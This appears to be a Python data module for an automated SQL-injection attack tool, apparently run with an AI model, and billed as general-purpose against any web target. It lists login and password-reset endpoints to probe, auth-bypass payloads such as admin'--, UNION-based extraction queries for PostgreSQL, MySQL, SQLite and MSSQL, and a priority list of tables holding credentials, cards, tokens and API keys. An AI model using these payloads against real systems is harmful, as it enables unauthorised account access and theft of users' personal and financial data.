"""
SQLi Scan Skill — Big Pickle methodology.

This skill encodes the exact approach Big Pickle used to discover and
confirm SQL injection vulnerabilities. It is general-purpose: it works
on any web target that has form or JSON API endpoints, not only the
lab target it was originally demonstrated on.

Big Pickle's methodology (in order):
  1. Fetch homepage → extract all endpoint hints from links/forms
  2. Probe a curated list of common API paths (login, register, forgot-password, etc.)
  3. For each discovered endpoint + field combination, run the payload ladder:
       a. Single-quote error test  → detects error-based SQLi
       b. Auth bypass tests        → confirms injectable + shows impact
       c. UNION column count       → increment NULLs until error disappears
       d. Reflection probe         → find which column echoes back
       e. Data extraction          → version, tables, sample rows
  4. Run sqlmap on confirmed-injectable endpoints for thorough validation
  5. AI model analyses all results and writes structured findings

Each step feeds its findings into the next. The skill stops on an
endpoint only when all five steps have been attempted, ensuring no
partial result is reported without evidence.
"""

from __future__ import annotations

# ──────────────────────────────────────────────────────────────────────────────
# Endpoint patterns — paths Big Pickle found injectable, generalised to cover
# any similar app. The plugin crawls the target first; these supplement crawl
# results so common but un-linked endpoints are never missed.
# ──────────────────────────────────────────────────────────────────────────────
COMMON_ENDPOINTS: list[dict] = [
    {"path": "/login",                    "method": "POST", "body": "json", "fields": ["username", "email"], "auth": False},
    {"path": "/register",                 "method": "POST", "body": "json", "fields": ["username", "email", "name"], "auth": False},
    {"path": "/api/login",                "method": "POST", "body": "json", "fields": ["username", "email"], "auth": False},
    {"path": "/api/register",             "method": "POST", "body": "json", "fields": ["username", "email", "name"], "auth": False},
    {"path": "/api/v1/login",             "method": "POST", "body": "json", "fields": ["username", "email"], "auth": False},
    {"path": "/api/v1/register",          "method": "POST", "body": "json", "fields": ["username", "email", "name"], "auth": False},
    {"path": "/api/v2/login",             "method": "POST", "body": "json", "fields": ["username", "email"], "auth": False},
    {"path": "/api/v3/login",             "method": "POST", "body": "json", "fields": ["username", "email"], "auth": False},
    {"path": "/api/v3/forgot-password",   "method": "POST", "body": "json", "fields": ["username", "email"], "auth": False},
    {"path": "/api/v3/reset-password",    "method": "POST", "body": "json", "fields": ["username", "reset_pin"], "auth": False},
    {"path": "/api/v1/merchants/login",   "method": "POST", "body": "json", "fields": ["email", "username"], "auth": False},
    {"path": "/api/v1/merchants/register","method": "POST", "body": "json", "fields": ["name", "email"], "auth": False},
    {"path": "/auth/login",               "method": "POST", "body": "json", "fields": ["username", "email"], "auth": False},
    {"path": "/auth/register",            "method": "POST", "body": "json", "fields": ["username", "email"], "auth": False},
    {"path": "/user/login",               "method": "POST", "body": "json", "fields": ["username", "email"], "auth": False},
    {"path": "/users/login",              "method": "POST", "body": "json", "fields": ["username", "email"], "auth": False},
    {"path": "/account/login",            "method": "POST", "body": "json", "fields": ["username", "email"], "auth": False},
    {"path": "/signin",                   "method": "POST", "body": "json", "fields": ["username", "email"], "auth": False},
    {"path": "/signup",                   "method": "POST", "body": "json", "fields": ["username", "email", "name"], "auth": False},
    {"path": "/forgot-password",          "method": "POST", "body": "json", "fields": ["username", "email"], "auth": False},
    {"path": "/reset-password",           "method": "POST", "body": "json", "fields": ["username", "token"], "auth": False},
    {"path": "/search",                   "method": "GET",  "body": "query","fields": ["q", "query", "search", "keyword"], "auth": False},
    {"path": "/api/search",               "method": "GET",  "body": "query","fields": ["q", "query", "search"], "auth": False},
    {"path": "/profile",                  "method": "GET",  "body": "query","fields": ["id", "user_id", "username"], "auth": True},
    {"path": "/api/user",                 "method": "GET",  "body": "query","fields": ["id", "user_id"], "auth": True},
    {"path": "/api/users",                "method": "GET",  "body": "query","fields": ["id", "username"], "auth": True},
]

# ──────────────────────────────────────────────────────────────────────────────
# Payload ladder — applied in order to each (endpoint, field) pair.
# ──────────────────────────────────────────────────────────────────────────────

# Step 1: Single-quote error probes — triggers a DB error on vulnerable apps.
# The original value is replaced (not appended) to ensure clean context.
ERROR_PROBES: list[dict] = [
    {"suffix": "'",           "label": "single-quote"},
    {"suffix": '"',           "label": "double-quote"},
    {"suffix": "\\",          "label": "backslash"},
    {"suffix": "1 OR 1=1",   "label": "boolean-no-quote"},
]

# Signatures that confirm a DB error was triggered (error-based SQLi).
DB_ERROR_SIGNATURES: list[str] = [
    "syntax error",
    "you have an error in your sql syntax",
    "unclosed quotation mark",
    "unterminated quoted string",
    "pg_query()",
    "sqlite3.operationalerror",
    "microsoft ole db",
    "ora-01756",
    "sqlstate",
    "invalid input syntax",
    "psycopg2",
    "sqlalchemy",
    "django.db",
    "operationalerror",
    "warning: mysql",
    "returning",            # PostgreSQL INSERT ... RETURNING leaks
]

# Step 2: Auth bypass payloads.
# Big Pickle used admin'-- (single quote + double dash, no space).
# These replace the ENTIRE field value.
AUTH_BYPASS_PAYLOADS: list[str] = [
    "admin'--",
    "' OR 1=1--",
    "' OR '1'='1'--",
    "admin' OR 1=1--",
    "' OR 1=1#",
    "') OR ('1'='1",
    "') OR 1=1--",
    "admin'/*",
    "1' OR 1=1--",
]

# Signals that a bypass succeeded.
SUCCESS_SIGNALS: list[str] = [
    "token", "jwt", "access_token", "bearer",
    "welcome", "dashboard", "success", "logged",
    "user_id", "account", "redirect",
]

# Step 3: UNION column count probes.
# Keep incrementing NULLs until the column-mismatch error DISAPPEARS.
# Max 20 columns; most apps are under 15.
UNION_MAX_COLS = 20

# Comment styles to try (in order).
COMMENT_STYLES: list[str] = ["--", "-- -", "#", "/*"]

# Step 4 / 5: Once column count and reflected position are known, these
# subqueries extract real data (PostgreSQL dialect; mysql variants provided
# as fallbacks).
EXTRACT_QUERIES: dict[str, dict[str, str]] = {
    "postgresql": {
        "version":   "version()",
        "tables":    "string_agg(table_name,' ' ORDER BY table_name) FROM information_schema.tables WHERE table_schema='public'",
        "columns":   "string_agg(column_name,' ' ORDER BY ordinal_position) FROM information_schema.columns WHERE table_name='{table}'",
    },
    "mysql": {
        "version":   "version()",
        "tables":    "group_concat(table_name ORDER BY table_name SEPARATOR ' ') FROM information_schema.tables WHERE table_schema=database()",
        "columns":   "group_concat(column_name ORDER BY ordinal_position SEPARATOR ' ') FROM information_schema.columns WHERE table_name='{table}'",
    },
    "sqlite": {
        "version":   "sqlite_version()",
        "tables":    "group_concat(name,' ') FROM sqlite_master WHERE type='table'",
        "columns":   "group_concat(name,' ') FROM pragma_table_info('{table}')",
    },
    "mssql": {
        "version":   "@@version",
        "tables":    "string_agg(name,'|') FROM sysobjects WHERE xtype='U'",
        "columns":   "string_agg(name,'|') FROM sys.columns WHERE object_id=OBJECT_ID('{table}')",
    },
}

# High-value table names — prioritised for data extraction.
HIGH_VALUE_TABLES: list[str] = [
    "users", "user", "accounts", "account", "admin", "admins",
    "credentials", "logins", "members", "customers", "clients",
    "merchants", "payments", "transactions", "cards", "orders",
    "tokens", "sessions", "api_keys", "secrets", "config", "settings",
]

# Dummy values used to fill non-target UNION columns (type-safe).
UNION_FILL_INT = "1"
UNION_FILL_TEXT = "null"
